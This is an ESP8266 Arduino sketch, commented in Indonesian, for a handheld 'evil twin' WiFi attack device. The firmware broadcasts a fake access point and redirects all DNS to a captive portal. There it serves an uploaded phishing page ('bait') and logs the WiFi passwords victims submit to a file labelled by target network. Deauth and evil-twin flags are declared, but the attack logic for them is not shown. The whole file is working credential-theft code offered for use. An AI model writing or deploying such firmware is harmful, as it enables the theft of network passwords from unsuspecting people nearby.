#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <Wire.h>
#include "SSD1306Wire.h"

// KONFIGURASI HARDWARE - LOCKED
SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48); // OLED 0.66"

// STRUKTUR DATA WIFI
struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int signal;
};

Network _networks[15];
Network _selectedNet;
String _logs = "[SYSTEM] Ready...\n";
String activeUmpan = "/index.html"; // Default peluru
String lastPass = "";
bool isDeauthing = false;
bool isEtwin = false;

DNSServer dnsServer;
ESP8266WebServer server(80);

// LOGIKA TAMPILAN OLED
void drawOLED() {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 0, "GM-PRO V3.9");
  display.drawLine(0, 11, 64, 11);

  if (lastPass != "") {
    display.drawString(0, 15, "GOT PASS!");
    display.drawString(0, 28, lastPass.substring(0, 8));
  } else if (isDeauthing) {
    display.drawString(0, 15, "ATTACKING");
    display.drawString(0, 28, "CH:" + String(_selectedNet.ch));
  } else {
    display.drawString(0, 15, "> STANDBY");
    display.drawString(0, 28, "VIVO1904");
  }
  display.display();
}

// HANDLER UPLOAD FILE (FILE MANAGER)
void handleUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    _logs += "[FILE] Uploading: " + filename + "\n";
    File file = SPIFFS.open(filename, "w");
    file.close();
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File file = SPIFFS.open(upload.filename, "a");
    if (file) file.write(upload.buf, upload.currentSize);
    file.close();
  }
}

void setup() {
  SPIFFS.begin();
  display.init();
  display.flipScreenVertically();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("vivo1904", "sangkur87"); // Identitas Alat
  
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  // ROUTING WEB SERVER
  server.on("/", HTTP_GET, []() {
    File f = SPIFFS.open("/index.html", "r");
    server.streamFile(f, "text/html");
    f.close();
  });

  server.on("/set_umpan", []() {
    activeUmpan = "/" + server.arg("file");
    _logs += "[UMPAN] Active: " + activeUmpan + "\n";
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/view_pass", []() {
    File f = SPIFFS.open("/pass.txt", "r");
    server.streamFile(f, "text/plain");
    f.close();
  });

  server.on("/delete_data", []() {
    SPIFFS.remove("/pass.txt"); // Hapus Brankas Saja
    _logs += "[CLEAN] Brankas Dikosongkan!\n";
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/html", "<script>location.href='/';</script>");
  }, handleUpload);

  // CAPTIVE PORTAL LOGIC
  server.onNotFound([]() {
    File f = SPIFFS.open(activeUmpan, "r");
    if (f) {
      server.streamFile(f, "text/html");
      f.close();
    } else {
      server.send(200, "text/plain", "Peluru HTML Belum di Upload!");
    }
  });

  // PENERIMA PASSWORD (LOGIN HANDLER)
  server.on("/login", []() {
    String p = server.arg("p");
    if (p != "") {
      lastPass = p;
      File f = SPIFFS.open("/pass.txt", "a");
      f.println("Target: " + _selectedNet.ssid + " | Pass: " + p);
      f.close();
      _logs += "[HIT] Pass Masuk: " + p + "\n";
    }
    server.send(200, "text/html", "Updating System...");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  drawOLED();
  
  // SCANNING LOGIC (Setiap 5 detik jika tidak deauth)
  if (!isDeauthing && millis() % 5000 == 0) {
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n && i < 15; i++) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].signal = WiFi.RSSI(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}
